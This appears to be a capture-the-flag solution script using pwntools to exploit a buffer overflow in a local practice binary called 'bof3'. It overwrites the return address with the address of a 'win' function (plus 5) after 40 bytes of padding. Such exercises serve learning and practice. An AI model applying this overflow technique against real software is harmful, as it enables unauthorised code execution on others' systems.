from pwn import *

p=process("./bof3")
exe = ELF("./bof3")
input()
payload = b'a'*40
payload += p64(exe.sym['win']+5)
p.sendafter(b'> ', payload)
            
p.interactive()
